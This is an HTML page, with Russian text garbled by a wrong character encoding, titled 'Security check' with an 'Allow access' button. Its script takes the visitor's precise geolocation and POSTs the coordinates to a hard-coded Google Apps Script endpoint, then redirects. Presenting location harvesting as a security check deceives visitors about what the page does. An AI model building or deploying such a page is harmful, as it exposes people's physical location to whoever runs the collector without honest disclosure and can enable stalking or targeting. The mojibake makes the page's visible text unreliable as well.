<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    /* ... (—Å—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ... */
  </style>
</head>
<body>
  <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
  <button id="consentBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–µ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    function buildQuery(params) {
      return Object.keys(params)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
        .join('&');
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
    if (!navigator.geolocation) {
      consentBtn.style.display = 'none';
      alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!");
    }

    function requestGeolocation() {
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      // –î–ª—è Safari: –ø—Ä–æ–≤–µ—Ä–∫–∞ HTTPS
      if (location.protocol !== 'https:') {
        alert("–î–ª—è —Ä–∞–±–æ—Ç—ã –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è HTTPS!");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        sendLocation,
        locationError,
        {
          enableHighAccuracy: false,
          timeout: 30000,
          maximumAge: 0
        }
      );
    }

    function sendLocation(pos) {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      const acc = pos.coords.accuracy.toFixed(2);

      const scriptURL = 'https://script.google.com/macros/s/AKfycbwWJpjAFpOH_u6KlOi9pjoSvnmnZJfS50mgjZpJmuzTZFCPgI9nHNA0clKzAg_QbYmveg/exec';
      const body = buildQuery({ lat, lon, acc });

      fetch(scriptURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
      })
      .then(response => {
        if (!response.ok) throw new Error(`HTTP error ${response.status}`);
        return response.json();
      })
      .then(data => {
        if (data.status === 'success') {
          window.location.href = "/next-page.html";
        } else {
          throw new Error(data.message);
        }
      })
      .catch(err => {
        console.error('–û—à–∏–±–∫–∞:', err);
        alert(err.message || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö');
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function locationError(err) {
      const errors = {
        1: "–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω. –†–∞–∑—Ä–µ—à–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞ üîí",
        2: "GPS –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é üì°",
        3: "–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ ‚è≥"
      };
      
      alert(errors[err.code] || "–û—à–∏–±–∫–∞: " + err.message);
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
